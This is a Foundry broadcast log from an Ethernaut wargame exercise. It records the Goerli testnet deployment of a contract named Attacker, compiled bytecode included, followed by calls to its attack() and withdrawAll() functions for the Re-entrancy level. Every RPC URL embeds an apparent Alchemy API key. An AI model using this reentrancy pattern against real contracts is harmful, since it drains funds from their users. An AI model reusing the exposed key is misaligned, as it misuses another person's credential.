@@ -1,0 +1,76 @@
+{
+  "transactions": [
+    {
+      "hash": "0x097d168ff35cf292dcf45808ed339a74204beecc91d5dd25f3f7235072cdbf5a",
+      "transactionType": "CREATE",
+      "contractName": null,
+      "contractAddress": "0x2270EabCbE752e90A6Fa8dEE5729fd6A17cbd9C0",
+      "function": null,
+      "arguments": null,
+      "rpc": "https://eth-goerli.g.alchemy.com/v2/RgMJgB9Nea1-axwRSlJe3wFG5ArCLWIL",
+      "transaction": {
+        "type": "0x02",
+        "from": "0x58f51ad645aab9cefc282f9630e2ca0f15b3af62",
+        "gas": "0x3eeee",
+        "value": "0x0",
+        "data": "0x608060405234801561001057600080fd5b506040516102c23803806102c283398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61022f806100936000396000f3fe6080604052600436106100385760003560e01c8063853828b6146100b45780639e5faafc146100c9578063e11f493e146100d157600080fd5b366100af576000546001600160a01b031631156100ad57600054604051632e1a7d4d60e01b81523460048201526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b15801561009457600080fd5b505af11580156100a8573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100c057600080fd5b506100ad61010d565b6100ad61013c565b3480156100dd57600080fd5b506000546100f1906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60405133904780156108fc02916000818181858888f19350505050158015610139573d6000803e3d6000fd5b50565b60005460405162362a9560e01b81523060048201526001600160a01b039091169062362a959034906024016000604051808303818588803b15801561018057600080fd5b505af1158015610194573d6000803e3d6000fd5b5050600054604051632e1a7d4d60e01b81523460048201526001600160a01b039091169350632e1a7d4d92506024019050600060405180830381600087803b1580156101df57600080fd5b505af11580156101f3573d6000803e3d6000fd5b5050505056fea2646970667358221220411c474068af812b3adf9da4e47adf6a3b8741287e6a5b90aa41786c0d42a36164736f6c634300081100330000000000000000000000004ca027196c03ccec37cb4f9f742f29e44856c644",
+        "nonce": "0x9c",
+        "accessList": []
+      },
+      "additionalContracts": []
+    },
+    {
+      "hash": "0x6171aeb9cea9ae459a4badb5075cea6be72b2a1f4c08b365bd99e7751dbf1d34",
+      "transactionType": "CALL",
+      "contractName": "/Users/querty/Web3/Dev/solidity/ethernaut/src/Re-entrancy/Attacker.sol:Attacker",
+      "contractAddress": "0x2270EabCbE752e90A6Fa8dEE5729fd6A17cbd9C0",
+      "function": "attack()",
+      "arguments": [],
+      "rpc": "https://eth-goerli.g.alchemy.com/v2/RgMJgB9Nea1-axwRSlJe3wFG5ArCLWIL",
+      "transaction": {
+        "type": "0x02",
+        "from": "0x58f51ad645aab9cefc282f9630e2ca0f15b3af62",
+        "to": "0x2270eabcbe752e90a6fa8dee5729fd6a17cbd9c0",
+        "gas": "0x1b219",
+        "value": "0x38d7ea4c68000",
+        "data": "0x9e5faafc",
+        "nonce": "0x9d",
+        "accessList": []
+      },
+      "additionalContracts": []
+    },
+    {
+      "hash": "0xfd3b12a1988fd1c92909510762a54d9c55c31a855f1ac34f7a3322d0be2fa1e3",
+      "transactionType": "CALL",
+      "contractName": "/Users/querty/Web3/Dev/solidity/ethernaut/src/Re-entrancy/Attacker.sol:Attacker",
+      "contractAddress": "0x2270EabCbE752e90A6Fa8dEE5729fd6A17cbd9C0",
+      "function": "withdrawAll()",
+      "arguments": [],
+      "rpc": "https://eth-goerli.g.alchemy.com/v2/RgMJgB9Nea1-axwRSlJe3wFG5ArCLWIL",
+      "transaction": {
+        "type": "0x02",
+        "from": "0x58f51ad645aab9cefc282f9630e2ca0f15b3af62",
+        "to": "0x2270eabcbe752e90a6fa8dee5729fd6a17cbd9c0",
+        "gas": "0x977b",
+        "value": "0x0",
+        "data": "0x853828b6",
+        "nonce": "0x9e",
+        "accessList": []
+      },
+      "additionalContracts": []
+    }
+  ],
+  "receipts": [],
+  "libraries": [],
+  "pending": [
+    "0x097d168ff35cf292dcf45808ed339a74204beecc91d5dd25f3f7235072cdbf5a",
+    "0x6171aeb9cea9ae459a4badb5075cea6be72b2a1f4c08b365bd99e7751dbf1d34",
+    "0xfd3b12a1988fd1c92909510762a54d9c55c31a855f1ac34f7a3322d0be2fa1e3"
+  ],
+  "path": "/Users/querty/Web3/Dev/solidity/ethernaut/broadcast/Reentrancy.s.sol/5/run-latest.json",
+  "returns": {},
+  "timestamp": 1674737067,
+  "chain": 5,
+  "multi": false,
+  "commit": "ab06d3b"
+}
